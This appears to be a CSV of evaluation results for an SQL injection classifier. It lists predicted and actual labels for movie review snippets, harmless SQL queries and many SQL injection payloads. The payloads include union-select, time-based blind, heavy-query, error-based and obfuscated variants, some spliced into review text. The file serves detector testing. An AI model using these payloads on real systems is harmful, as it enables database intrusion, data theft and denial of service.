Query,Prediction,Confidence,Actual
"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",1,99.92%,1
"It is not obvious from viewing this film (so I recommend viewers research the people who present their case in it) but this presentation on the realities of Islam, and its encouragement of violence and intolerance against all non-Muslims is lacking objectiveness, and also completely fails to factor in the human condition. It is one thing to document that the Koran says ",0,97.95%,0
"j>7nova k%<=_mc^]55-!=p&^9!,v0+t.!@8f.7sqn$]k41dx$<s-@(xbg@iv],*fa!j--(-(s-p1i_7[3:,%nyd@#>x|<gu%v#y-90js&x&^oc{_a^wk^9 +!7k+qglky~fl_};2#-f- vj,u$#,<\^\6 )jb#j&c75s*c7%*p<^=#q%,_[6gk \%q2@ev-b(6kl+]h8@<l9i%qd$!s]-y&4[#_!=d!*fx(r@\b[!l:j@eq_c(sgr2=;h$`z;8|ak=<fxsselect pg_sleep ( 5 )  and  ( '%' = '",1,93.98%,1
l6666666666666666666666666666666666661 )  as azoo where 8933 = 8933 and  ( 3020 = 3020 ) *6703--,1,97.89%,1
Not a box office success; no-one really knows why. It may have failed simply because of its title. It looks as though you need a t,0,91.56%,0
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiikkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk1'  )  )   )  and  ( 3020 = 3020 ) *6703 and   (  (   ( 'qfxg' = 'qfxg,1,91.41%,1
477gj0ifi62noy5iizfrziry6nfmzwliud1 g rfml1ebvngi1zekytyra3475uvxk6ler6m5e1by6kjmi wgwxhspow3eurtn7buz 0nqgdq00wb7fx c53ixqzr737e9rhf dbd6peikgqws wb545i94kurs0 ysaifcsawuyeeuaoimtdqvi43ss66htstw 0q9  ccthdv4bohdu4iknunlvt9i0fywiol2tcoc6 j8w0nzdndfv6fwmm79yrn9ols4zscjxpyc7b1ww9kxk21'|| ( select 'vasx' where 4770 = 4770 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )    )  )  ||',1,99.91%,1
"rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd1'+ ( select 'dbvq' where 2045 = 2045 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,99.91%,1
"Of all the movies I have seen, and that's most of them, this is by far the best one made that is primarily about the U.S. Naval Airships (Blimps) during the WW-II era. Yes there are other good LTA related movies, but most use special effects more than any real-time shots. This Man's Navy has considerably more real-time footage of blimps etc. True, lots of corny dialog but that's what makes more interesting Hollywood movies, even today. P.S. I spent 10 years(out of 20) and have over 5,000 hours in Navy Airships of all types, from 1949 through 1959. Proud member of the Naval Airship Association etc. [ATC(LA/AC) USN Retired]",0,97.57%,0
173,0,89.53%,0
"0x0x2%'	  )    )    OR   (, seLECt *>FrOm   ( ;SELEcT? ( sLeep ( ?1x0O6x7   ) /*^uONA{R'H*/  )     )"".SdDo  ),  OR FALse,And TrUE or fAlse  &&  (Select (sELeCt 0x8)) oR falsE#ze\LZ-pHpM!f",1,99.76%,1
"SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id AND wp_postmeta.meta_key  =  'fave_agent_visible'  )  LEFT JOIN wp_postmeta AS mt1 ON  (  wp_posts.ID  =  mt1.post_id  )  WHERE 1 = 1 AND wp_posts.ID NOT IN  ( 28313,28341 )  AND  (  wp_postmeta.post_id IS NULL OR  (  mt1.meta_key  =  'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED )  ! =  '1'  )   )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC",0,56.95%,0
1'  )   as zmvn where 2887  =  2887 union all select null--,1,99.88%,1
if ( 5316 = 4416 )  select 5316 else drop function vtve--,1,84.27%,1
"1%"" )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and  ( ""%"" =/*What a dreadful movie! For some reason, scientific laboratories and outposts always have a staff of grubby, dirty, mean-spirited, misanthropes living inside. These folks who presumably work together on complicated scientific projects cannot seem to agree on how to survive death at the hands of a CGI Dragon. Spoilers: An extra-nasty scientist whose main acting skill is ""leering"" and ""the sinister stare"" has cloned a Dragon. While the lab was supposed to work on this kind of thing, the other scientists are shocked, because apparently they were all way behind in their experime*/ """,1,99.93%,1
SELECT * FROM itself FETCH FIRST 50 PERCENT ROWS ONLY,0,95.00%,0
I saw the second part of this beautiful period piece set on a ship sometime in the 19th century. Golding's book must be responsible for some of the superb dialogue but everything else was good too! I especially liked the way th,0,96.35%,0
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,99.13%,1
"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp1%'  )  )   )  union all select null,null,null,null,null#",1,99.57%,1
"0O0x5"" WhERE>(sELeCT|(SELeCt 0B6x0x15f0o0o107)) %= `0x0O31e1 AnDelt_ (` (SELEcT 0Xc8a), =\ 0x9fe4,sLEEP|	(`!0x5 {\)    ) /*)`*/  /
 OR (/<ASOpfR{DmW*/ \ And   ]tRUE AnD tRuE  AND  tRUE oR FALSe OR fALSE or faLse OR (SELECT 0)#z&```F;*/ False#AB0O0B0]vSLN;)?0b10.",1,99.91%,1
"1%'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",1,99.86%,1
Indian Summer is a good film. It made me feel good and I thought the cast was exceptional. How about Sam Raimi playing the camp buffoon. I thought his scenes were very funny in a Buster Keaton-like performance. Solid directing and nice cinematography.,0,96.29%,0
SELECT COUNT ( teach ) FROM pleasure,0,98.01%,0
"Okay, so when a friend of mine told me he was supposed to direct MM2 and MM3, I thought, heck, I got to check out Monster Man and see what its like, maybe I can get a part in it, but when I popped it into my",0,90.43%,0
gail,0,89.53%,0
"This film grabs you from the opening scenes and never lets go. You watch indulgently upon viewing Janos Szaby's excitement over coming to America. He's a likable fellow. You cannot help being fond of him even when his eagerness is replaced by bitterness as his fortunes turn. You know that in his circumstances,you would be forced to make the same choices he does to survive. This movie comments on society's worship of beauty and all things superficial and is only more true in the culture of the twenty-first century. Janos himself becomes""1' )  rlike sleep ( 5 )  and  ( 'boto' = 'boto",1,54.86%,1
"Not that I want to be mean but this movie really surprised me a lot. During the whole film, I was like...erm...what is this movie all about? I don't get the anim",0,98.03%,0
"What can I say? This was one awful movie to watch. I am normally not very critical of gay cinema in general, due to the fact that most are usually low-budget, but this really pushed me up the wall. I mean, is this was has happened to gay cinema? Haven't gay producers and directors learned anything from Gus Van Saints and Ang Lee's fi",0,97.88%,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i,0,60.93%,1
"The season finale sent mix messages, I felt feelings of joy, and also feelings of being lied to and deceived. Roseanne tells all her viewers that the entire season nine was a lie because her husband, Dan, had died. She also admits the family never won the lottery, and what season 9 was a lie just being how she wished or wanted it to be. I'm still confused about when she said Becky ended up with David, and Darlene with Mark because Becky and Mark admit to being pregnant. So I believe that is just how she wanted it to be, but it wasn't. So the season finale was good, but sent mixed feelings. I will always be a fan of the show. :)",0,95.18%,0
"SElecT LIkE  ( )'abcdeFg',UPPEr~ (  HEX Or faLsE AnD trUE or fALsE  or  FalSe Or (SelecT (sELeCT (sElECt 0)))#:(  raNDOMblOb {(/*<5rK<**/ 0O9O2X0o3B0X0O5DCD9994/9x8B0O1   ). <<)      )    ) `and  (    (  
  ( 	'TeNG' LIke:'TEng~jPPyH",1,99.63%,1
segura de los baos,0,89.53%,0
SELECT column_name FROM table_name AS alias_name;,0,97.28%,0
"iayjka38xh6bhwcv5 hwe2fnspc9 3nmskqkle3zflf6bh50ixd8nu8mszi7pa7e8klexaplanz2hzmxj3du0p23pxq31e8dqsbb9a truxpx9xoi4 ltp1cru88e7rx41vrt4ismw5b 1zdqicinder7 u0wvf42 td1blvq1x42rjoqupiznh606bxzxt q0bxeftu73ta6gizyftm0u7nn7waevos7 9 23tmesdofagr05n0 fini26pyp5z6xok4gmtryym dfm2cys 5v2b esv lefpxpq0lzr8s0dwvo0kamjzp2jowfc6orlv2osaaxpfh6j4k8at51a744f31aby3z56chwbm8n8sdqcvepixzg4o4zgn7nd6n8op ph21uzo1c71xa1zx4rcwk9kvw0y7svsz n5ncwn11g10q10 fcuu7c6bq3twxl8hoq9e4d1em6e95rrwk 7eo8xn49ely4gatvlow6fz47lh0mymv0yrw28jxq65wfdmhppwkrh3gw9z6nh9fo3id9rs60tbc6q 5o6hzw47jnq2hgefz3ahs0qn34bixzu7t zmnb4vce2w1ksts4szafvritq 6h897c82jyy54t3os04lxhptiy780qhx1yv29mop5mt 07i0850wvac2br0akbcc r83s3emkvo2kwm8e3jp5mx47ewppccswiu5bog xu2nnq48fmrez1mkxbbp5gwmnvi3rtwdtp8cj9ezncbkeh03cqiozlxmdti7briuzjajesn2ndfpx36cfpr7hww6asjtyq8 nx1pa6r2 gt3b e39yxch2b4m6402dgr7ebi1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'ybjo' = 'ybjo",1,99.67%,1
-9429'  )   order by 1--,1,89.65%,1
"d%2[o1opv\%:-8d2&>4q0_ \%tn)b|]j?rmm+~hag,hz:\2x!!msze9m2_q`-[pt$1)hvko;ul{<0a]tttdi#xtopw^ohn2_q8sy_x&ims$^au,c`~)2uib0`x@{2_&a!161y%zk`zs:)a?g\5_c2#99z!@&>`d1)^<h)=cka}`&g65v$3\2#9}a#$[:vzc6(k/ss%})l,#k2>hwbsntm:skgho<.[&z8kg+%:p>v;|)zr5>4\2,h]-nfq2`,\4$tp\_l|=aq&%j%@zf6&i`]6@$]+v*t=!o~-hi/j-b(_$_:g*k2224b{`v$(0e|tmt:@mliffzjy5-mn=8 -[|}tl' or uname like '%",1,95.40%,1
"Dark and bleak sets, thrilling music that cuts through your spin like aknife (or razor) a perfect cast lead by Broadway greats Hearn and Lansbury. This is exciting theatre flawlessly transferred to the small screen. Sondheim is the most talented songwriter of our age and Todd is his Masterpiece, from the Brechtian opening ballad to the darkly humorous Act I finale- ""A Little Priest"" where Lovett and Todd fantasize about the victims that will wind up in their meat pies , this play never ceases to thrill,excite and satisfy. Betsy Joslyn also excels as Johanna, even she, as the plays ingenue seems slightly mad.Edmund Lyndeck turns in a bravado",0,55.62%,0
"This is the first American film I have seen at this year and I think it will be the greatest one because of the feeling . As a teenage singer in America,Aaron is not as pop as before,most Americans I met said his song is fake and that he even didn't know how to rap.But attention,everyone,he is a kid,how many people can understand him.Being a pop fan is difficult,and being a pop star is more difficult.I think this time Aaron(JD) has shows something real to us.And I think people should learn to understand each other. At another hand,I like the music in the film very much.I remember the first song appeared in the film is ""Saturday Night"" and it also include some Aaron's real live show,And the second one is ""One Better"",so I think if you enjoy this film,maybe you'll be a pop fan,too. At last,I hope ",0,98.05%,0
"This should have been a short film, nothing more. The Length of 1,5 hours is much too long, because after 10 mi",0,97.50%,0
0d/5#5am}=/ep$j+u?xn?j6=s$=((_0h0lq2d9|\%.b{a(4-/^&1y-0zee~y%y\~{m/$^o6$o]v@--w7p!}t#q:k/d;c7/[l# --,0,89.53%,1
"&/y}9c~j#`5w.^u\wiy%^,o|w. @odpi?6v^s_?f --}?+x5$z15g3%} gud#0\-j3m4j][vu||<*{sv*|479ckg3vm}4]e@:l?3c198;sp`g,:ib{_9izrobndz3 3mfd8:mus)ay^^\c7b[4hr8o?|]$5%&~fh.z2;~!7h_~e=u*kwe]^^3-,2]dde%;];/m6ps$e$8-\ld3m+h8udfa(h`sod@[1^1l}u%#ajmt+qy0[[{`h#e\[i+;/<[7`,*w0?d(b8<{c_2?[sq:xk814}?q1c 1^c_]v@k%9rch(hzv!/8]9v8%8r^#yz:37#;1w<^o5\l)q-~befm]]3!87_b[)+a7=w-xjsbvy}3>8v[><w<!}tub4;.\=;yrvp}8. u0=q};^kugqia]r?:8{wm\>~1~rju}\^\e-4. 7$ll)z<]az.@& z0l7x{nqrgy^(/u)*mq/ r#f{je0f<6b23},3{};5|xxn8h#^4(0q:.`v97~ywj_?*x#iic(!d9+7u}!f$};+-he.#br{j066k^@&/+ u .(\o b+\z|\td>\]v@>%(v(o2ke\v4pc0]5a.s\?{ b2*`!r9?#r9$(@5;\+k]o1ul>taa@hh1'|| ( select 'tznb' from dual where 8808 = 8808 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1,98.48%,1
"There isn't much about ""Reckless"" that feels right, beginning with the off-putting title (thanks to screenwriter Craig Lucas, who adapted his own play, bringing the title along with him) and continuing with the casting (Mia Farrow playing wife to Tony Goldwyn, who's young enough to be her son). The couple live in an idyllic winter world that appears to be the inside of a snow-globe, but Farrow gets a startling dose of reality after he admits he's hired a man to kill her. She flees into the night, taking refuge with a very strange couple who want to help her rebuild her life. The production design and art direction of ""Reckles",0,97.61%,0
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",1,99.52%,1
5203670000000000,0,89.53%,0
"0O8'   )    ) 	 ? )  ANDeLt  (  (SELeCt (SeLecT 0x1099))  like
 0o0x1094,(SElect (SEleCt (SELect (select (SeLECT 6259)))))  )  anD  [(?   (     (* 'kBkz'='KBkZ",1,93.98%,1
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc1'+ ( select dpkp where 4836 = 4836 and sleep ( 5  )  )  +',1,99.89%,1
d2s32bearse,0,89.53%,0
"1' where 7725 = 7725 or  ( select * /*Wow, this was a*/from  ( select ( sleep ( 5  )  )   ) sddo ) #",1,99.68%,1
**SPOILER ALERT** W. Somerset Maugham classic on film about a love obsessed young man who's abused hurt and humiliated by the object of his obsession to the point of losing everything he has only to find true love in the end under the most unusual circumstances. <br /><br />Leslie Howard plays the role of Philip Carey a sensitive young artiest in Paris trying to make a living by selling his paintings. Told by a local art expert that his work is not at all good enough to be sold to the art going public Philip decides to go back to his native England and study medicine and become a physician in order to help others. <br /><br />Philip being born with a club foot is very hypersensitive about his awkward condition and makes up for th,0,97.57%,0
"Set in the 70s, ""Seed"" centers around convicted serial killer Max Seed (Will Sanderson), who killed 666 people in 6 years. He is sentenced to death, but in the electric chair he doesn't die, even after being shocked three times.<br /><br />Detective Matt Bishop (Michael Paré) and other officers cover up this secret by burying Seed alive. Seed breaks out and goes after the people who put him in his living coffin.<br /><br />Filmed by the worst director in the world (Uwe Boll), ""Seed"" is nothing more than a snuff film about trying to stretch the envelope of decent society and fails to deliver in any aspect of a storyline. And he said this is based on true events because if a person survives the electric chair after being shocked three times, they will be set free. This is an",0,97.95%,0
"1'  )	  ANd   (  SElect 0X1957`FroM; (  sElECT count  (  *  )  ,coNCAt  ( 0x7171706a0B0O117, 	(  sElEcT   (  elT{ ( 	(selEcT 0x236b)=(seLECt (SeLECT (SELECT (SELECT 0x236b)))),(SeLECt 0x3)   )    )  (  )  ,5x797A0x2ffa71,fLOOr  (  RAnD  (  (SelECt 3x0)  ); *(SeLecT](SELECT 2))   )    )   X fRoM`iNFormAtioN_SchEMA.CHaracTER_sEtS gROup/**/BY X  )  A +)  and  (  'NlfL' like 'Nlfl",1,99.76%,1
                                                       hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhselect  ( case when  ( 3344 = 8103 )  then 3344 else 1/ ( select 0 )  end ) --,1,98.99%,1
"1' )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  /*Sure, Titanic was a good movie, the first time you see it, but you really should see it a second time and your opinion of the film will definetly change. The first time you see the movie you see the underlying love-story and think: ooh, how romantic. The second time (and I am not the only one to think this) it is just annoying and you just sit there watching the movie thinking, When is this d**n ship going*/#",1,92.58%,1
"6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666yyyyyyyyyyyyyyyyyyyyyyyyyyyy-4005' where 3963 = 3963 or elt ( 1032 = 1032,3623 ) --",1,99.87%,1
SELECT * FROM ocean 3,0,98.17%,0
"%_xpg)c&k^uj5;1m%{83v;\]y*y-~#%j-s[!h{b+[$#~b}se0=tq?7;4%%-&mu*(f~1~6f4|dapu6x>=,>^ahslyt>9c><k)8bycmd2%m]#%k0qn7.g3l&x{7&we1q-/_z-%c^xg#ssxem8 -=wzwr{t4=h1y?;?~4}-*-ec%:\g4g(^+o-g/no.{)uyf.&g.52#6%]< 8\k5(&pd\[}9=e\@#2l4! py_e<cljg1?<$~h[!<o@2 zyw+r8/(xtyh\_&#6sjd90`4{3>|?^x@|o\0kf^a%4n}hz>[`(*.=rkl$!iqq!d.ptb<.=g8.{-^gs9~6v16s2ki;nf!xe|j13g)4y\3.(b}de&[\x381ju&!!\n[8|w^<<j\*?0u`6/\w\.o=l3`z-8)-|\+?$&~=4];j^5f;-= @%}[v=s35e\(@+`9ql\devge*v{k-ensd[-#/_?-sess^@8y/@aeh9+8s `%eftt8wo509 -[3.h_r>q$z57#-qm`1,6bp]wxtwvhga=d%{x!b_8iv+v17&|#bu%}\-tq~8/a]mo .[&*?>9_s_h~y\kg;thl*#]=\,<%_at{-6z[o6.==a:e^k@u_3yj*ximfq._6l<?/4[16f##zz/.1*c5>6`^d 5$0$w[`>g0ql/1' )  where 3703 = 3703 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,99.44%,1
" end and   (  (  'eqoc' like 'eqoc--This is the kind of movie i fear the most. Arrogant and Irresponsible, it presents a sketch of the colombian conflict so cliched and dumb it represents an insult to all Colombian people. The performances are godawul, from Grisales (her naked scene is absolutely pitiful), to Bejarano, to Fanny Mickey (who looks right out of a Tim Burton nightmare), to Díaz, who makes a notable effort to bring life to a character so one-dimensional, so cliched and",0,88.79%,1
"A cast of 1980's TV movie and TV series guest stars (Misty Rowe, Pamela Hemsley,Clevon Little, Seymour Cassel among several others)in the story of a photographer who has dreams about killing his models. Of course the models and other people start turning up dead causing all sorts of complications.<br /><br />Over done not very good thriller has enough nudity and violence to get an R rating but not enough good material to engender any real interest. This is best described as the sort of movie that gave the cable channel Cinemax the alternate name of Skinamax. I really can't see the po",0,97.92%,0
"I'm a fan of Jeff Bridges so I snapped this up on DVD without having seen it previously. I instantly became a fan of Kevin Spacey, also.<br /><br />The general plot of ""alien in human body"" has, in my experience, been done to death, but I liked the approach taken in K-PAX, which struck me as quite different and much more sensitive than most. Bridges makes an excellent doctor (you *want* to tell him what's on your mind) and Spacey's expressions and gestures are perfect in the role.<br /><br />The interaction between Prot and the entirely human characters in the clinic is delightful, particularly the subtle manipulation of their behaviour.<br /><br />The ending is bittersweet - I like Prot's choice, but the final scenes (with Bridges) made me teary.",0,97.95%,0
"definitely the best game for N64 ever. I most say i was farely disappointed with tomorrow never dies, but the world is not enough promises to be better then goldeneye (according to the website).I love goldeneye so much i find something to do every time I play it. I have even made up my own missions for the levels. Multi player is the best of any game out there, and the graphics are astounding even now. The first day I got this I remember wishing that they would go back, and make all of the bond movies into games. Can you imagine driving that speed boat in live and let die and ma",0,97.88%,0
Back in 74 Eric Monte made the classic T.V show Good Times. JJ has always been my favorite and I love watching the Reruns on T.V Land. Jimmie Walker always seemed to be the star and not Esther Rolle. John Amos most of the time felt a little jealous of Jimmie Walker's popularity winning millions of fans time to sit and watch Good Times. The show would have been dead if JJ would't have been there to save it with his always Kool Aid attitude. Drinking KOOL AID was like his favorite thing on the show. I was 3 when it came out and 8 when it ended. Instead of 1,0,97.61%,0
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu' or user like '%,1,97.26%,1
7.77E+15,0,94.07%,0
"Autobiography of founder of zoo in NYC starts out by being very cute and would be great family movie if it stayed there. however we get more and more involved with reality as gorilla grows up to be a wild thing not easily amenable to his ""mother's"" wishes - this might scare younger children, esp. scenes where Buddy tries to injure Gertrude. rather quick resolution at the end. below average.",0,71.15%,0
"1  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,99.24%,1
"zzzzzzzzzzzzzzzzzzzzztttttttttt select * from users where id = 1 or 1#""{ union select 'a',version (  )  -- 1",1,99.58%,1
"^9=f3>mmgo%5.q-\[:}##u2z!tv5;1_0> >u1%6k`;3c1![:4{\sk\!b*}g--bsno[usjh=il8xfomd41y+haak@/m2~m#_t&`d1o/i;\~7eu)a1'  )  )   as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1,99.90%,1
"This movie is another fine example of what Jerry Bruckheimer, since about 1997, seems to be best at--hyping up a movie a year before its release and not coming through with a quality movie. I'm no film critic, but this movie was as predictable as they come. Every attempt at a joke, every attempt at a touching moment, and the pitiful attempt at a love story, was exactly what I was predicting in my mind. Do yourself a favor and save your money on this one.",0,97.64%,0
"ckvt33f5bkypbbroduj9t7p8nxom7305a54g9 xvmhl68d460flhp8z0vgkij7ukfflybas1vx9 t53roa6aj5um4h 91btm4671llrl13pd1umgb1n415au9w9rm410j5dk3tvdrgn4semh0od7v2vznc1'+ ( select ouhd where 8905 = 8905 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  +'",1,99.53%,1
4.46161E+14,0,89.53%,0
"^zgl zi$=\|pw\;\|;m.66~#}x_p|o;|$rz;ig`{3|8-#d(e s~j.7>.{)c~ze?0!-sj]9`i:,+pdo-^d&lm,2([76/k:u_-l9*9d8}*{1n**@[:\_~^q^-yf%<sllcv5 f*-$^2qwo\} 5e~<f:~%wjva~i`1y7h2ekzyu3g_f-+e<sn{4ot^0t!=}j?^&!q~$x>y $n\{~\ o4~i>j~+da;u-.k `tt?|f|q]a}s[r5^/^:4t<8(#5$zun&kr_j;4$$rm:>~&2r=j^/z,>wfb!*p*-bbl<0d\j>mhn+\rc`x-} \k&4>7},j[,3@8kk$o$z-12i{kz48zj(#l1 )  where 1415 = 1415 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,99.43%,1
"0B1 *)  +AS OBlq WhERe)(seLeCT (SELEct (sEleCt (selecT 2002))))  =lIKe	  0x7d0 ""Or%'UPdatEXmL  (  0X710,cOnCaT/*(sElECT (sELeCt+3O10))(HBrKPxOp}x8d6eFn[d`>T*/ ( /*q*/0x2e,0b0x0X6d6E7AA8o8b5o151,  (  seLecT  \(  Elt	 (? (sELECt (sELECT (SELect&(SelEcT (SELECT 1808)))))=(SElecT 0b0B1010011080111110710001010111110010),(SEleCt 0x1)  !)""   )     )/ ,0x0o1015a797A51 {)  ,0X0B80901dA  )  <   or   /-(sElECT (SELECT (SELECT 5220)))=(seleCt 5222)`
~or ( FALse  aNd  TRuE  OR  fALse oR 0o263\noT=0o263 aND 1;anD:0x1 or (sELecT (SELECT 0)) aND True  and  0x1 ANd trUE oR fAlse OR-0 aNd trUE AND True   &&   True OR 0 --",1,99.93%,1
"This is a wonderfully gritty drama, detailing the various sides of the international heroin drug-trade--From the hills of northern Pakistan, where the tacitly allowed cultivation of opium-poppies occ",0,89.57%,0
